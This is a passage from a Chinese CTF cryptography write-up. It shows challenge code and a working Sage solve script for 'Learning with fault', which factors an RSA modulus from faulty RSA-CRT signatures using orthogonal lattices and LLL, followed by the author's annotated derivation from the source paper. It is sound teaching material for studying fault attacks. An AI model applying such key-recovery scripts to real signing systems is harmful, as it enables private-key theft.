Legendre(a,p):\n    return (pow((a%p+p)%p,(p-1)//2,p))%p\n\ndef get_ts(p):\n    p=p-1\n    count=0\n    while p%2==0:\n        count+=1\n        p=p//2\n    return count,p\n\ndef get_nonre(p):\n    a=random.randint(1,p)\n    while Legendre(a,p)==1:\n        a=random.randint(1,p)\n    return a\n\ndef amm2(a,p):\n    t,s=get_ts(p)\n    ta=pow(get_nonre(p),s,p)\n    tb=pow(a,s,p)\n    h=1\n    for i in range(1,t):\n        d=pow(tb,2**t-1-i,p)\n        if d==1:\n            k=0\n        else:\n            k=1\n        tb=(tb*pow(ta,2*k,p))%p\n        h=(h*pow(ta,k,p))%p\n        ta=pow(ta,2,p)\n    return h*pow(a,(s+1)//2,p)%p  \n\ndef solve(a,b,c,p):\n    tmpa=1\n    tmpb=b*inverse(a,p)%p\n    tmpc=c*inverse(a,p)%p\n    assert Legendre(tmpb**2*inverse(4,p)-tmpc,p)==1\n    res1=(amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    res2=(-amm2(tmpb**2*inverse(4,p)-tmpc,p)-tmpb*inverse(2,p))%p\n    return (res1,res2)\n\ndef lift(x,a,b,p):\n    tmp=b*(x**2-1)*inverse(a*x,p)%p\n    return solve(1,-tmp,-1,p)[0]\n\np=9410547699903726871336507117271550134683191140146415131394654141737636910570480327296351841515571767317596027931492843621727002889086193529096531342265353\na=54733430689690725746438325219044741824500093621550218736194675295708808435509\nb=75237024593957256761258687646797952793573177095902495908321724558796076392871\nx=bytes_to_long(flag)\n\nwhile True:\n    try:\n        y=lift(x,a,b,p)\n        break\n    except:\n        x+=1\n        continue\n\nassert a*x*(y**2-1)%p==b*y*(x**2-1)%p\n\nP=(x,y)\ne=65537\n\neP=mul(e,P)\nprint(f\"P = {P}\")\nprint(f\"eP = {eP}\")\n'''\nP = (56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149, 5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)\neP = (mpz(8694229840573103722999959579565187489450818138005222030156495740841851804943200684116883831426548909867463656993852596745698999492932194245562062558787005), mpz(9279986963919197374405152604360936066932975197577643570458423456304679111057526702737279809805694360981565554506626018364382736924914907001214909905449002))\n'''\n```\n\n这题真的是蚌不住，刚放出来解出数就蹭蹭往上涨，还有点怀疑人生，然后仔细观察题目，一看上面，什么玩意，再看下面，什么玩意。。。\n直接拿第一个数 `long_to_bytes` ，得到 flag。\n\n## Learning with fault\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secrets import flag\nimport os\n\nclass RSA():\n    def __init__(self,p,q,e):\n        self.p=p\n        self.q=q\n        self.e=e\n        self.phi=(p-1)*(q-1)\n        self.d=invert(self.e,self.phi)\n        self.dp=self.d%(p-1)\n        self.dq=self.d%(q-1)\n        self.n=p*q\n        self.N=getPrime(512)*getPrime(512)\n\n    def sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.n)\n\n    def corrupt_sign(self,message):\n        m=bytes_to_long(message)\n        sig_p=pow(m,self.dp,self.p)\n        sig_q=pow(m,self.dq,self.q)\n        alpha=q*invert(q,p)\n        beta=p*invert(p,q)\n        return long_to_bytes((alpha*sig_p+beta*sig_q)%self.N)\n\n    def verify(self,message,sign):\n        return long_to_bytes(pow(bytes_to_long(sign),self.e,self.n))==message\n\np=getPrime(512)\nq=getPrime(512)\ne=65537\nrsa=RSA(p,q,e)\n\nwith open(\"sign.txt\",\"w\") as f1:\n    with open(\"corrupted_sign.txt\",\"w\") as f2:\n        for _ in range(6):\n            message=os.urandom(64)\n            sign=rsa.sign(message)\n            corrupted_sign=rsa.corrupt_sign(message)\n            assert rsa.verify(message,sign)\n            f1.write(str(sign)+'\\n')\n            f2.write(str(corrupted_sign)+'\\n')\n\nenc=pow(bytes_to_long(flag),rsa.e,rsa.n)\nprint(f\"n = {rsa.n}\")\nprint(f\"N = {rsa.N}\")\nprint(f\"e = {rsa.e}\")\nprint(f\"enc = {enc}\")\n'''\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n'''\n```\n\n出题论文：<https://eprint.iacr.org/2011/388.pdf>\n这题一开始是搜到了论文，瞟了两眼，以为不是，就没看下去了。。。\n后来学长发给我这篇，我焯了两个钟复现出来了，说不定真有机会现场解出，唉还是太菜。\n照着论文的 Attack Summary 敲就行了，一开始没理解到 $z$ 向量的意思，直接从格子拿，跑不出来，学长问我 $a$ 和 $b$ 的选取是不是有问题，我才知道要枚举出所有 $x$ 和 $y$ 。然后 $a$ 和 $b$ 在 0 到 10 间选取也不行，改成了 -10 到 10 。\nexp 如下：\n\n```python\nfrom tqdm import tqdm\nfrom itertools import combinations\nfrom sage.all import *\nfrom Crypto.Util.number import *\nco_sig = [b\"\\x17\\x8bb3\\x11\\x1b\\xb9\\xb9\\xc6M\\xb0\\xaa\\x07-\\x1ar\\xff\\xfb\\xb4&H7!\\xb8\\xa1\\xce\\x07\\x8b\\x84M\\x0bw=m\\x193Oc\\x97w\\x8f\\xffy4\\xa1\\x99\\xfcW\\xf9|\\xeb\\xa4\\x00\\x1eD*\\xe8-'\\xa9\\xef\\x9d\\x13*\\xf4\\xbe\\x9d\\x9b&w\\xcb\\xfd\\xb3\\xb6\\xa3n\\xb8\\xb4\\x97vT\\xec@\\x86\\xd1R\\xb0\\n\\xe1uC\\xbc\\x14\\xeb\\xceSu&'{\\xb9\\x12\\x90\\x82\\xc7,\\xdbr\\xebP\\xe1j\\x11E\\xd5\\x17\\xe1\\xd0D\\xe7z\\x94vt\\xbf\\x1a\\xc4+\",\n          b'\\x1dJ\\xc5\\xb2\\xbe\\x05\\xe6\\xc8T\\n\\xbe\"\\xbeU\\xed\\xba\\xec\\x85\\x05\\x8b\\x8ayE\\xa3}0\\x1dk\\xa7\\x10\\xe2E\\x19\\xfe\\x10\\x90\\xef\\r\\xdbV\\x8b\\x87|(\\xd1\\xb5\\xfd\\xb9\\x14\\x84\\x05\\x03\\x81\\xc8\\xf6\\xe5\\x8a\\x92\\xa0\\x01I\\x8aG:\\xc19\\x9e\\xf0\\x8eZ\\\\Yx\\x80|\\xb7\\x80\\x0e\\xcd\\xa3\\xba6\\xf8\\x98\\xb1pB\\x05\\x8aT#\\xbf\\x1e\\x1b~\\xcb\\xf5\\t\\xa2H9\\xc9n\\x81e\\xa2\\x15\\x97\\x11\\xe4\\x93\\xf2\\xe6\\x80\\x97\\x99G\\xb5\\xfe\\x07/\\xd2\\xbd\\xad\\xcf\\x04\\x9e\\xd0',\n          b'Gs\\xda\\xb8\\x8a\\x85\\xccK\\xf7\\xa8y\\x16\\xa5\\xf0\\x06\\xbe\\xeb\\x83&}a\\x85q\\x8d:\\x1fSb\\xb8\\xc5\\x84\\xba*[\\xe7\\xbb{\\x86\\xd3\\xb3r\\xb6\\xaaCN\\x93\\x1d<(\\xe2\\x1c;\\x8crU\\x8fD=W\\xa7\\x0b\\xc7\\xeag\\x96\\x06\\xd6\\xbb\\xe4\\x04b\\xd8\\x02\\x12\\xd6\\xfa2\\x1e#\\xf0\\xde\\x8b\\x88M\\xd2\\xf47\\\\\\x98\\xe0\\x04Fu\\x1bsy\\xf2\\xc4\\xad\\xd6Y\\x81u~B:\\xd2\\x1f\\xb3\\xab\\x01:\\xfa\\xdf\\x19J8\\xd0\\x18RN\\xfe,CA\\x15\\xb3\\xe0',\n          b\"0I\\xda5\\x9f\\x05v\\x17\\xdc\\xd4q\\xd6\\x83,\\x9d\\r\\xccc\\x8a\\xa1\\xd4U\\xd3\\x18\\xc9\\xc6g\\xcd\\nX\\x99Ah\\xed}\\xf3\\xb1(\\xd5I\\xc6\\x0f@yw9\\x9d\\xfdv\\x15x\\xeaRA\\xd6\\xb0\\x1e\\xb5B\\xe5\\x05cc\\x06m\\xf4NN'\\x02q\\x1a\\x11\\xe4\\x87P:\\xc8\\x11a\\x9f\\xbd\\x9c\\x98x\\xda\\xea\\xc4\\xa8f\\x89s\\xcaJ\\x7f\\xeb\\xd8\\xc1G#\\xf4\\xdc\\xe2\\x01\\xf2\\xa5\\x95\\x19`)2!\\xf5\\xb9\\xf0\\xf2\\xbb\\xf8\\x0bF&&`\\xfd*\\xe1\\xf2\\x9c\",\n          b':\\x99/Hxt\\xd1\\xd4\\xaaB\\xd6H\\x16\\xe1\\xc9\\xe2\\xb3\\xc3\\xa9b\\xd3\\x96\\x9c\\x05x6\\xf1\\xc3d\\xa2\\xd1U+.\\x1b\\xac^\\xf6Mh7\\xb7\\x03\\x8e\\xdc\\xca\\x0bn\\xac\\xed\\x92\\xb8x\\x04)\\x0f|\\x11\\xcc\\xfa\\xf2\\\\\\xba\\xee\\xc4X\\xa8(\\x05\\xf2\\xb5\\x8f&\\xf3\\xff\\x1eB\\xe7\\x94\\xf4\\xa6\\x00!\\xe5v\\xd9x\\xf0s\\x94\\xf4D(\\xa9g\\x118\\xa7z\\x83\\xad\\xdb\\xe6\\xe3\\xe7\\xf8\\xf2\\xef\\xe5@\\xe9\\x13\\x00OB\\xcc\\x05\\xd1,_=\\xd2/Og\\x81\\xa6+',\n          b'\\x1c|\\xb6\\xcc\\xdfj\\xc5\\xa0s\\xac w\\xa6\\xf2\\x87D\\xe3\\xf9Y\\xf5=\\xf0\\x0b\\xd9\\xea\\x89,+e\\x1e\\xb7m#\\x99\\xd1\\x87\\x17Z\\xed\\x1d\\xc8\\x97;\\xa0K\\x05.\\xaa<\\xc6s\\xcf\\xa2\\xa2\\\\PO\\x12&\\xb4\\x11\\xec\\xad\\x10\\xf8\\xf7\\xd1\\xd3_\\x80\\x17\\xe0\\x1eP\\x93\\xe3\\xc2\\x1e\\x03\\xea]^\\xc6a\\x9c\\xcb\\x90\\xbb\\x9f\\x8by\\xa5dhM\\xce\\xc7\\xbc\\xf7\\xafe\\xcf\\xc1\\xf1\\x18@\\x1e\\xe2\\xdb\\xfb\\xe4^\\xc8\\xe7\\x19\\xccnY\\xc6o\\x7fL\\x9fV\\xd4\\xc4\\x15\\xe8',\n          ]\nsig = [b'\\t\\x8b\\xde\\x98\\x84\\x1d\\x9e\\xd4\\xa0\\xb7f\\xe0\\x05\\xb1\\xbd8\\xb9G\\xe3\\x0c\\x83\\x8a\\xe5\\xf0G7\\x12\\x1eT\\x85o-B\\xe4_\\xd2\\x04\\xd9:\\xab\\xdf\\xa1 \\x8f\\xedt+\\x0f\\xce\\xb5\\x90\\xaaK\\xf0U~v=\\x84\\xe7$G\\xf5\\xfb\\xd3ok~V\\x1a\\xec&\\x15\\x18Y\\x0c\\x80u\\xafF\\xf1\\x10\\x9f\\xf2\\xe6\\xa6\\x9a\\xbb\\xbd+\\xa4l\\xa9\\x11\\xd5\\t\\x13\\x16\\xa3\\xde\\xe1\\xdfZ\\xa9$r\\xb5`\\xc9\"\\x11\\xab\\xc5\\x87\\xc4\\x1d@\\x9e\\xa4t\\xdb#\\xbdj\\xcb\\x95\\xefK',\n       b'z/\\xd6\\xfb\\xd8\\xfa\\xc4\\xed\\xbd\\x99\\xd0\\xa0\\x90\\xcb\\xca\\x83\\xd8B\\xa7\\xf4\\xbd\\xe0\\xc2&\\x1aQl(\\xd6p\\x8f\\x89=tT\\xf1(\\xeb\\xab\\x84[oR\\x1fl=\\xda\\xf5\\x18q\\x8f\\xa7k\\x00\\x1b\\x1a\\x0ei\\x1fa.ho\\x15\\x04\\x12\\xe4\\xc2\\xd7\\x19\\x92\\xc3\\x9b\\xfe\\xd5\\xb6R\\xf8\\x95\\x9fr\\x93\\xddD\\x1c[\\x873\\xd5\\x06\\x1b\\xa5\\x82/6\\x9a\\x13\\xcf\\xa4\\xcd\\x0e]\\t\\xad?\\xd6\\x84\\r\\x90\\xef\\x86\\xf15)\\xe34\\xf7\\xb77\\xef\\x0c&\\xdb8\\xa6\\xe0\\xa5a',\n       b'U\\x0b\\xf6\\x9cm])1\\xe2\\xad\\xf9G\\x8f\\xa2\\xbc}\\xd7\\x18\\x89\\xa4\\xfdFQ\\x80m\"\\xf9\\to^\\xd9A\\x98\\xd2\\xca\\x1e(b\\xa8\\xbe\\xc2m\\xf7\\n[O\\x00\\xbc\\x87\\x17\\xed\\x0cG\\xf2=H\\x0e\\xc0\\x14+\\xcb\\xd0\\x1feT2\\xf2Th\\xec\\xc2\\xcf>6,<\\x88X\\x8f\\xe9g\\xa8\\x00\\xafr\\x05\\x95\\rj\\x9c\\xc6\\n\\xbb\\x8a\\x019\\xc1\\x1ef#\\x02[Rh\\xd8\\xdc|{6\\xeb\\xe8U\\x91\\xa4\\xeb}\\xf4s;E\\xe72$i\\xdft\\xff\\'',\n       b'[\\x94\\x95T\\xf4\\xc4\\xca\\x8drO\\x80\\x14\\xc9<H\\xa2a\\xdc\\xf4`\\xac>\\xab\\x03\\xfa\\x80Sx\\x99\\x14\\x83$U\\x0b\\xfa\\x8fv\\xfd\\xda\\x1a\\xa0\\xebY\\xaa\\x01\\xe2XsG\\t\\xcf\\xae\\xa0\\xbf\\x82iG\\tQ \\xb1\\xfe\\xa5k\\x12\\xd9\\x12\\xf7\\x95\\xa3\\xa5\\x8d`z\\x19\\x1a\\x90-\\x9aj\\x15\\xf6f>\\x18\\x08\\xb8\\x1f\\x88\\x1a\\x80Th\\xd0\\x15\\x9bw#\\'`K\\xa5\\xf1\\xbf\"\\xe79\\xaf\\xc7z%p\\xa5\\x9f\\x14\\xef\\'1\\x11\\x05Gg\\xe9\\xda\\xc9\\x18~[',\n       b':\\xefRE\\xd7\\xa1?\\xf3\\xb5\\xf7\\xdd\\xe2\\xb6~\\x85014\\xc0\\x8a\\x80\\xe1\\xb5#\\x94\\x10\\xb2\\xa0\\xfe\\x87\\xd1t\\xc3$&\\xde8\\x195\\xcd\\xf4@3\\x15\\xcaK\\xcc\\xcd\\r:\\x83*\\xd7l\\xb6\\xf2} \\tJ\\xb5xKfjh.\\xfb\\xb5\\x91\\xc6\\xf2x\\x8e\\x83\\xdc\\xc3\\xef\\x8b\\x8dW\\xa6\\xa6\\xb0w\\xd8\\xf2G\\xa5-\\xc3\\x87\\x17;\\xedH`:\\xcd\\x08ts\\x9eqPE\\xd7\\xfc\\xc4\\x98\\xb5\\xe0\\xad\\xb7A\\x7f\\xcb\\x01\\xbd\\x98\\xd3Ea\\xb9\\x07\\x80\\xf8\\x19',\n       b\"8\\xca\\x7f!;\\\\\\xde\\x1b\\x80i\\x9b!\\x1c??u\\x13\\x955\\xd0xG\\xff\\xd7\\xba\\xfe+\\x95\\x0eu^\\x15\\x1a\\x0e*\\xfe\\x8a\\xafM\\xc0\\xd1Ty\\xd7\\xf1\\xa7@\\xd6\\xa6\\xee\\x0c:It\\x1a\\xeag\\xfc\\x0c\\xaf\\x02<\\x03T)\\xeb\\xb0\\x15\\x1cz\\x85\\x992\\xa9\\xbe\\x9bm\\xc4D\\x83\\xf7\\xb5T\\xdd9?\\x94\\xd4\\x13\\xb4\\xb3\\x8d\\xa9\\x92\\x9dt\\x86\\xdb\\x0b$\\x19l\\xb1\\xb9\\x05'o\\xf3!\\t\\x01\\x93'z\\x15P\\x88\\xd7iN\\n\\x8bA\\xb5\\xd2}\\xe8\\x10\"\n       ]\nn = 99670316685463632788041383175090257045961799409733877510733415402955763322569510896091638507050126669571444467488936880059210773298729542608112756526719533574432327269721804307073353651955251188547245641771980139488000798458617636759823027148955008149512692983471670488580994385743789385091027299901520585729\nN = 81332992898551792936282861980393365170738006789835182134055801566584228471896473385776004610279937176800796971820133195300006470892468060034368863410462219133248069442508287516929262751427926825122839525496671527936622212986733708071962237633082743396115729744192159064241674410003857168101669882043743570731\ne = 65537\nenc = 2476965183785968993595493003363618829317072815989584886372189393899395623714779397354978469504773556228655475355703015337932838278988328384587983506790841663233499939173166353582189202860394411808445422387063648198432242875738065748287034529713834303346017134249834382745931627301273142828893469374138264396\n\n\ndef orthogonal_lattice(B):\n    _d, _n = B.nrows(), B.ncols()\n    _c = 2 ** min(((_n-1)/2+(_n-_d)*(_n-_d-1)/4), 20)\n    for b in B:\n        _c *= b.norm()\n    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))\n    B_r = B_bot.transpose().LLL()\n    LB = B_r.matrix_from_rows_and_columns(range(_n-_d), range(_d, _n+_d))\n    assert (B*LB.transpose()).is_zero()\n    return LB\n\n\nv = [crt([bytes_to_long(co_sig[i]), bytes_to_long(sig[i])], [N, n])\n     for i in range(6)]\n\nLv = orthogonal_lattice(matrix(ZZ, v))\n\nresult = orthogonal_lattice(Lv.matrix_from_rows(range(0, 6-2)))\n\nfor x, y in combinations(result, 2):\n    for a in tqdm(range(-10, 10)):\n        for b in range(-10, 10):\n            z = a*x+b*y\n            if z.norm() > sqrt(6*n):\n                continue\n            else:\n                vv = vector(v)-z\n                for i in vv:\n                    if gcd(i, n) != 1:\n                        p = gcd(i, n)\n                        assert n % gcd(i, n) == 0\n                        q = n//p\n                        phi = (p-1)*(q-1)\n                        d = inverse_mod(e, phi)\n                        m = long_to_bytes(int(pow(enc, d, n)))\n                        print(m)\n                        exit()\n```\n\n### 原理\n\nRSA-CRT 签名中计算了：\n$$\n\\sigma_p=\\mu(m)^d\\mod \\ p \\\\\\\\  \\sigma_q=\\mu(m)^d\\mod \\ q\n$$\n然后签名 $\\sigma=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta$ ，其中 $\\alpha=q\\cdot(q^{-1}\\mod\\ p)$ ， $\\beta=p\\cdot(p^{-1}\\mod\\ q)$ 。\n题目中给出 6 对签名，每对签名用 CRT 不难算出\n$$\nv=\\sigma_p\\cdot\\alpha+\\sigma_q\\cdot\\beta \\mod N\\cdot N'\n$$\n其中 $\\sigma_p$ 和 $\\sigma_q$ 和 $N/2$ 一个数量级， $\\alpha$ 和 $\\beta$ 又和 $N$ 一个数量级，故右式远小于 $N\\cdot N'$ ，那么**上式在整数域上是成立的**。\n一对算不出，但是多对可以，组成向量，有：\n$$\n\\boldsymbol{v}=\\alpha\\boldsymbol{x}+\\beta\\boldsymbol{y}\n$$\n其中 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 是分量 $n/2$ 位的未知向量， $\\alpha$ 和 $\\beta$ 是有关 $p$ 和 $q$ 的 CRT 系数。\n不难计算出一组与 $\\mathbb{Z}^\\ell$ 中正交于 $\\boldsymbol{v}$ 的向量的格 $\\boldsymbol{v}^\\bot \\in \\mathbb{Z}^\\ell$ 的约化基 $\\{\\boldsymbol{b}_1,...,\\boldsymbol{b}\\_{\\ell-1}\\}$ 。（可能此时你会疑惑为什么是 ${\\ell-1}$ 个向量，下面的拓展里有解释）\n特别地，我们有：\n$$\n\\alpha \\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle + \\beta \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0 \\quad \\mathrm{for} \\ j=1,2,\\ldots,\\ell-1\n$$\n~~（也不是很特别的感觉）~~\n现在观察方程 $\\alpha\\cdot u+\\beta\\cdot v=0$ ，最小的非零解 $(u,v)\\in \\mathbb{Z}^2$ 是 $\\pm(\\beta,-\\alpha)/g$ ，其中 $g=\\gcd(\\alpha,\\beta)$ 盲猜是非常小的（经测试基本在10以内），意味着 $|u|,|v|\\geq\\mathit{\\Omega}(N)$ 中 $\\mathit{\\Omega}$ 常量是非常小的。（啥玩意？）对 $j=1,2,\\ldots,\\ell-1$ ，有以下两种可能：\n\n**情形1**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle = \\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle = 0$ 。此时 $\\boldsymbol{b}_j$ 属于 $\\mathbb{Z}^\\ell$ 中与 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 正交的向量的格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$\n\n**情形2**：$\\langle \\boldsymbol{b}_j,\\boldsymbol{x} \\rangle$ 和 $\\langle \\boldsymbol{b}_j,\\boldsymbol{y} \\rangle$ 有绝对值 $\\geq \\mathit{\\Omega}(N)$ ，其中 $\\mathit{\\Omega}(N)$ 是一个小常数。因为 $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 的范数都不超过 $\\sqrt{\\ell N}$ ，由柯西-施瓦茨不等式，这意味着 $||\\boldsymbol{b}_j||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$\n\n因为格 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 的秩是 $\\ell-2$ ，当全部 $\\ell-1$ 个向量 $\\boldsymbol{b}\\_j$ 线性无关时情形1不成立，所以最长的 $\\boldsymbol{b}\\_{\\ell-1}$ 应该在情形2中，因此 $||\\boldsymbol{b}\\_{\\ell-1}||\\geq \\mathit{\\Omega}(\\sqrt{\\ell N})$ 。另一方面，其他向量形成一个秩为 $\\ell-2$ 的格，且体积\n$$\nV=\\mathrm{vol}(\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}\\_{\\ell-2})\\approx\\frac{\\mathrm{vol}(\\boldsymbol{v}^\\bot)}{||\\boldsymbol{b}\\_{\\ell-1}||}=\\frac{||\\boldsymbol{v}||}{||\\boldsymbol{b}\\_{\\ell-1}||}\\leq \\frac{\\sqrt{\\ell}\\cdot N^{3/2}}{\\mathit{\\Omega}(\\sqrt{N/\\ell})}=O(\\ell N)\n$$\n盲猜是一个随机的格。特别地，我们有：\n$$\n||\\boldsymbol{b}\\_j||=O(\\sqrt{\\ell-2}\\cdot V^{1/(\\ell-2)})=O(\\ell^{1/2+1/(\\ell-2)}\\cdot N^{1/(\\ell-2)})\\quad\\mathrm{for} \\ j=1,2,\\ldots,\\ell-2\n$$\n\n一旦 $\\ell \\geq 5$ ，这个长度就远小于 $\\sqrt{N/\\ell}$ 。假设是这种情况，那么对于 $j=1,2,...,\\ell-2$ ， $\\boldsymbol{b}\\_j$ 应该是情形1中。这意味着这些向量生成 $L=\\{\\boldsymbol{x},\\boldsymbol{y}\\}^\\bot$ 中一个满秩的子格 $L'=\\mathbb{Z}\\boldsymbol{b}\\_1\\oplus\\cdots\\oplus\\mathbb{Z}\\boldsymbol{b}_{\\ell-2}$ 。\n取正交格，我们得到 $(L')^\\bot \\supset L^\\bot=\\mathbb{Z}\\boldsymbol{x}\\oplus\\mathbb{Z}\\boldsymbol{y} $。因此， $\\boldsymbol{x}$ 和 $\\boldsymbol{y}$ 属于 $L'$ 的正交格 $(L')^\\bot$ 。令 $\\{\\boldsymbol{x'},\\boldsymbol{y'}\\}$ 为一组该格的约化基，我们可以枚举 $(L')^\\bot$ 中的长度不超过 $\\sqrt{\\ell N}$ 且为 $\\boldsymbol{x'}$ 和 $\\boldsymbol{y'}$ 线性组合的所有格向量。高斯启发式表明这大约为：\n$$\n\\frac{\\pi(\\sqrt{\\ell N})^2}{\\mathrm{vol}((L')^\\bot)}=\\frac{\\pi\\ell N}{V}=O(1)\n$$\n这样的向量，所以这肯定是可行的。对这些向量 $\\boldsymbol{z}$ ，我们计算 $\\gcd(\\boldsymbol{v}-\\boldsymbol{z},N)$ 。我们将因此很快在其中找到 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)$ ，因为 $\\boldsymbol{x}$ 是一个 $(L')^\\bot$ 中长度 $\\leq\\sqrt{\\ell N}$ 的向量。但根据 $\\boldsymbol{v}$ 的定义，我们有：\n$$\n\\boldsymbol{v}=\\boldsymbol{x}\\mod p\\\\\\\\\n\\boldsymbol{v}=\\boldsymbol{y}\\mod q\n$$\n故 $\\gcd(\\boldsymbol{v}-\\boldsymbol{x},N)=p$ ，从而分解 $N$ 。\n\n### 拓展阅读-正交格\n\n令 $\\mathbf{b}_1,...,\\mathbf{b}_d$ 为 $\\mathit{\\Lambda}$ （这玩意念Lambda）中的向量。如果这 $d$ 个向量在 $\\mathbf{Z}$ 上线性无关且 $\\mathit{\\Lambda}$ 中的任意元素可以由 $\\mathbf{b}_i$ 整系数线性表出，则这 $d$ 个向量形成 $\\mathit{\\Lambda}$ 中的一组基。 $\\mathit{\\Lambda}$ 中至少存在一组基。 $\\mathit{\\Lambda}$ 的基都有相同的基数，称为 $\\mathit{\\Lambda}$ 的维度。\n\n如果 $\\mathit{\\Omega}$ 包含 $\\mathit{\\Lambda}$ ，且两者有相同的维度，则称 $\\mathit{\\Lambda}$ 为 $\\mathit{\\Omega}$ 在 $\\mathbf{Z}^n$ 上的一个子格。（子格的定义？） $\\mathit{\\Lambda}$ 的所有基张成相同的 $\\mathbf{Q}^n$ 的 $Q$ 向量子空间（啥玩意？），记为 $E_{\\mathit{\\Lambda}}$ 。 $\\mathbf{Q}^n$ 上 $E_{\\mathit{\\Lambda}}$ 的维度与 $\\mathit{\\Lambda}$ 的维度相同。令格 $\\overline{\\mathit{\\Lambda}}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 。 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 的一个子格。如果 $\\mathit{\\Lambda}=\\overline{\\mathit{\\Lambda}}$ ，那么我们称 $\\mathit{\\Lambda}$ 是一个完备格，特别的， $\\overline{\\mathit{\\Lambda}}$ 是一个完备格。\n\n> 笔者注记：\n这里首先将 $\\mathit{\\Lambda}$ 张成一个**有理数空间**，不局限于**整系数**向量组合了，记为 $E_{\\mathit{\\Lambda}}$ 的E我猜是**欧几里得**的意思？然后与 $\\mathbf{Z}^n$ 相交得到的是整数点集合 $\\overline{\\mathit{\\Lambda}}$ ，如此 $\\mathit{\\Lambda}$ 是 $\\overline{\\mathit{\\Lambda}}$ 子格的事应该挺自然的。然后如果两者相等，想象一下，都那样张成了都找不到新的点，那这个格确实也挺完备。\nPS:发现自己念了十年的欧几里得，难怪输入法打不出来（）\n\n令 $(\\mathbf{x},\\mathbf{y})\\rightarrow\\mathbf{x}.\\mathbf{y}$ 为一般意义上的欧里几德内积， $||.||$ 是它对应的范数 ~~（奇怪的表示方法）~~。令 $F=(E_{\\mathit{\\Lambda}})^-$ 是关于该内积的正交向量子空间。我们定义正交格 $\\mathit{\\Lambda}^-=F\\cap\\mathbf{Z}^n$ 。因此， $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格，其维度为 $n-d$ 。这意味着 $(\\mathit{\\Lambda}^-)^-$ 等于 $\\overline{\\mathit{\\Lambda}}$ 。令 $\\mathcal{B}=(\\mathbf{b}_1,...,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基。\n\n> 笔者注记：\n看到这就有点迷糊了，捋一捋： $E_{\\mathit{\\Lambda}}$ 是 $\\mathit{\\Lambda}$ 张成出的有理空间，然后 $F$ 是其正交向量子空间，即**任意从 $\\mathit{\\Lambda}$ 和 $F$ 分别抓两个向量出来，其内积都为 $0$** 。\n再然后 $\\mathit{\\Lambda}^-$ 是 $F$ 的一个子格，**注意到 $\\mathit{\\Lambda}^-$ 把 $F$ 所有整数点都框进去了**，这就很有意思了，由上面的定义就不难得出正交格 $\\mathit{\\Lambda}^-$ 是一个 $\\mathbf{Z}^n$ 上的完备格。\n至于其维度为何是 $n-d$ ，有个概念叫**正交补**，就是正交空间的维数是刚刚好的，对于列空间维数为 $r$ 的矩阵 $A_{r\\times m}$ ，其左零空间的维数是 $m-r$ ，相加恰好为 $m$ 。举例来说，三维中与线正交的是二维空间，与面正交的是一维空间。\n这篇 paper 习惯用 $E^-$ 表示正交向量子空间，但似乎 $E^\\bot$ 的写法较为广泛。\n\n在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：\n\n$$\n\\mathbf{b}\\_j =\n\\begin{pmatrix}\nb_{1,j} \\\\\\\\\nb_{2,j} \\\\\\\\\n\\vdots \\\\\\\\\nb_{n,j}\n\\end{pmatrix}\n$$\n（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）\n\n定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。\n\n> 笔者注记：\n这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）\n至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为\n$$\n\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) 